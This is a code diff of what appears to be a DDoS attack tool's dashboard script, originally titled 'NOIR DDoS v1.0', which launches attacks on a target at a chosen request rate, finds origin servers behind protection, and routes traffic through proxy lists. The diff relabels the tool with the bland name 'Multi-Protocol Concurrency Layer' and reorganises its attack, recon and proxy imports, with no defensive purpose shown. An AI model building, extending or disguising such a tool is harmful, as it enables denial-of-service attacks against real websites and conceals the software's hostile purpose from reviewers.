@@ -1,6 +1,6 @@
-#!/usr/bin/env python3
+﻿#!/usr/bin/env python3
 """
-NOIR DDoS v1.0 - Dashboard + Attack Orchestrator
+Multi-Protocol Concurrency Layer - Dashboard + Attack Orchestrator
 Colorful realtime dashboard with one-click attack controls.
 """
 import asyncio
@@ -31,7 +31,7 @@ _state = {
 
 async def stream_metrics(dashboard, args, attack_metrics_fn):
     """Background task: stream metrics every chunk_seconds."""
-    from core.dashboard import MetricsSnapshot
+    from core.monitor.dashboard import MetricsSnapshot
 
     chunk_seconds = max(1, args.chunk_seconds)
     while _state["running_task"] is not None:
@@ -64,8 +64,8 @@ async def stream_metrics(dashboard, args, attack_metrics_fn):
 
 async def run_attack_cmd(target: str, method: str, duration: int, rps: int, dashboard, args):
     """Run attack and stream metrics chunks."""
-    from core.enhanced_attack import run_enhanced_attack
-    from core.dashboard import MetricsSnapshot
+    from core.attack.enhanced import run_enhanced_attack
+    from core.monitor.dashboard import MetricsSnapshot
 
     if not target.startswith(("http://", "https://", "ws://", "wss://")):
         target = "https://" + target
@@ -144,8 +144,8 @@ async def run_seo_scan(target: str, dashboard) -> Dict[str, Any]:
         target = "https://" + target
     await dashboard.broadcast_event("SEO_SCAN", "DASHBOARD", target, "OK")
     try:
-        from core.intel_engine import TargetAnalyzer
-        from core.endpoint_engine import SmartEndpointDiscovery
+        from core.recon.intel import TargetAnalyzer
+        from core.recon.endpoint import SmartEndpointDiscovery
         ta = TargetAnalyzer()
         prof = ta.analyze(target)
         sd = SmartEndpointDiscovery()
@@ -170,7 +170,7 @@ async def run_find_origin(target: str, dashboard) -> Dict[str, Any]:
         target = "https://" + target
     await dashboard.broadcast_event("FIND_ORIGIN", "DASHBOARD", target, "OK")
     try:
-        from core.origin_finder import OriginFinder
+        from core.recon.origin_finder import OriginFinder
         finder = OriginFinder()
         report = finder.find_origin(target)
         result = {
@@ -191,7 +191,7 @@ async def run_test_proxies(dashboard) -> Dict[str, Any]:
     """[Menu 5] Test Proxies."""
     await dashboard.broadcast_event("TEST_PROXIES", "DASHBOARD", "alive.txt", "OK")
     try:
-        from core.proxy_engine import ProxyPool
+        from core.network.proxy import ProxyPool
         pool = ProxyPool()
         n = await pool.load_file("proxies/alive.txt")
         if n == 0:
@@ -257,7 +257,7 @@ async def command_handler(action: str, payload: Dict[str, Any], dashboard, args)
 
 async def main():
     parser = argparse.ArgumentParser(
-        description="NOIR DDoS v1.0 - Dashboard with One-Click Attack",
+        description="Multi-Protocol Concurrency Layer - Dashboard with One-Click Attack",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
@@ -301,11 +301,11 @@ After launch, open http://localhost:8090 to control attacks via UI.
             logger.error("=" * 60)
             return
 
-    from core.dashboard import DashboardServer, MetricsSnapshot, DASHBOARD_HTML
+    from core.monitor.dashboard import DashboardServer, MetricsSnapshot, DASHBOARD_HTML
     from aiohttp import web
 
     logger.info("=" * 60)
-    logger.info("NOIR DDoS v1.0 - Attack Dashboard")
+    logger.info("Multi-Protocol Concurrency Layer - Attack Dashboard")
     logger.info("=" * 60)
 
     # Patch HTML with WS port
@@ -344,7 +344,7 @@ After launch, open http://localhost:8090 to control attacks via UI.
     logger.info("")
 
     # Idle metrics broadcast
-    from core.dashboard import MetricsSnapshot
+    from core.monitor.dashboard import MetricsSnapshot
     async def idle_loop():
         while True:
             await asyncio.sleep(args.chunk_seconds)
